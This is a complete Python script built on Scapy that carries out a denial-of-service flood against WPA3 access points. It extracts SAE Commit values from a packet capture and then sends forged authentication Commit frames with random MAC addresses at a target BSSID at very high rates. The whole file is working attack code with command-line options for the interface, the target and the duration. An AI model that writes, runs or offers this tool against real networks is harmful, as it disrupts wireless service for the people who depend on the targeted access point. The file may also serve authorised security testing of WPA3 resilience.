import argparse
import random
import time
import sys

from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, rdpcap

def extract_sae_commit_values(pcap_file):
    """
    Extract 32-byte scalar and finite-field elements from SAE Commit frames in a PCAP.
    """
    packets = rdpcap(pcap_file)

    scalars = []
    finites = []
    for pkt in packets:
        if pkt.haslayer(Dot11Auth) and len(pkt) > 140:
            auth_payload = bytes(pkt[Dot11Auth])
            scalars.append(auth_payload[-64:-32])
            finites.append(auth_payload[-32:])

    return scalars, finites

def rand_mac():
    return ':'.join(f'{random.randint(0, 255):02x}' for _ in range(6))

def auth_frame(bssid):
    client = rand_mac()
    return (
        RadioTap() /
        Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid) /
        Dot11Auth(algo=3, seqnum=1, status=0)
    )

def construct_commit(bssid, scalar_list, finite_list):
    return auth_frame(bssid) / b'\x13\x00' / random.choice(scalar_list) / random.choice(finite_list)

def attack(bssid, iface, duration, interval, scalar_list, finite_list):
    if not scalar_list or not finite_list:
        print("ERROR: No scalars or finite elements extracted—nothing to send.", file=sys.stderr)
        sys.exit(1)

    print(f"Starting SAE Commit attack on {bssid} for {duration}s "
          f"(iface={iface}, interval={interval}s, "
          f"{len(scalar_list)} scalars, {len(finite_list)} finites)")
    end = time.time() + duration
    count = 0

    while time.time() < end:
        sendp(construct_commit(bssid, scalar_list, finite_list), iface=iface, verbose=False)
        count += 1
        print(f'  [{count}] frame sent')
        time.sleep(interval)

    print(f"Attack finished: {count} frames sent in {duration}s")

def parse_args():
    p = argparse.ArgumentParser(
        description="SAE Commit attack using extracted scalars & finite elements from a PCAP"
    )
    p.add_argument('-f', '--file',    required=True, help="PCAP file containing SAE Commit frames")
    p.add_argument('-i', '--iface',   required=True, help="Monitor-mode interface (e.g., wlan0mon)")
    p.add_argument('-b', '--bssid',   required=True, help="BSSID of the target AP")
    p.add_argument('-t', '--time',    required=True, type=int, help="Duration of the attack (seconds)")
    p.add_argument('-r', '--interval',type=float, default=0.0001,
                   help="Interval between frame transmissions (seconds, default: 0.0001)")
    return p.parse_args()

def main():
    args = parse_args()
    scalars, finites = extract_sae_commit_values(args.file)
    print(f"Extracted {len(scalars)} scalars and {len(finites)} finite elements")
    attack(
        bssid=args.bssid,
        iface=args.iface,
        duration=args.time,
        interval=args.interval,
        scalar_list=scalars,
        finite_list=finites
    )

if __name__ == "__main__":
    main()